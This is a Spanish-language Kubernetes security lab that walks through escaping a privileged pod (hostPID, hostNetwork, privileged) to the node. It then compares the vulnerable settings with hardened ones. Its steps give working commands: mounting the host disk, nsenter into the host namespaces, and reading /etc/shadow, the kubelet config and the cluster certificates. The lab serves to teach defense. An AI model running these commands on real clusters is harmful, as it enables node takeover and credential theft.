# Lab 4: Pod Privilegiado - Container Escape

## Objetivo

Demostrar como un Pod con `hostPID: true`, `hostNetwork: true` y `privileged: true`
permite un escape completo del contenedor al host subyacente, dando acceso total
al nodo de Kubernetes.

| Propiedad        | Valor                                         |
|------------------|-----------------------------------------------|
| **Namespace**    | `lab4-escape`                                 |
| **Ataque**       | hostPID + privileged -> montar host -> chroot |
| **Defensa**      | PSA restricted + drop ALL + non-root          |
| **Dificultad**   | Intermedia                                    |

---

## Requisitos

- Cluster Kubernetes activo
- kubectl configurado

---
### Paso 1 — Desplegar el pod privilegiado

```bash
kubectl apply -f vulnerable-privileged.yaml

kubectl get pods -n lab4-escape
kubectl wait --for=condition=Ready pod/privileged-pod -n lab4-escape --timeout=120s
```

### Paso 2 — Verificar acceso a procesos del host

```bash
# Entrar al pod privilegiado
kubectl exec -it privileged-pod -n lab4-escape -- bash

# Ver TODOS los procesos del host (hostPID: true)
ps aux | head -20

# Verificar que estamos como root
whoami
id
```

### Paso 3 — Escape: Montar el filesystem del host

```bash
# Dentro del pod: crear punto de montaje
mkdir -p /mnt/host

# Montar el disco raiz del host
mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/vda1 /mnt/host 2>/dev/null

# Alternativa con nsenter (acceso directo al namespace del host)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Ahora estamos en el host!
cat /etc/hostname
cat /etc/os-release
```

### Paso 4 — Leer informacion sensible del host

```bash
# Leer shadow (hashes de passwords)
cat /etc/shadow

# Leer configuracion de kubelet
cat /var/lib/kubelet/config.yaml 2>/dev/null

# Ver certificados del cluster
ls /etc/kubernetes/pki/ 2>/dev/null

exit
exit
```
## Diferencias Clave

| Aspecto                    | Vulnerable        | Seguro                 |
|----------------------------|-------------------|------------------------|
| `hostPID`                  | `true`            | `false`                |
| `hostNetwork`              | `true`            | `false`                |
| `privileged`               | `true`            | `false`                |
| `runAsNonRoot`             | No (root)         | `true` (uid 101)       |
| `readOnlyRootFilesystem`   | No                | `true`                 |
| `capabilities`             | Todas             | `drop: ["ALL"]`        |
| `seccompProfile`           | Ninguno           | `RuntimeDefault`       |
| `allowPrivilegeEscalation` | Default (true)    | `false`                |
| PSA Label                  | Ninguno           | `restricted`           |

---

## Limpieza

```bash
kubectl delete namespace lab4-escape
```
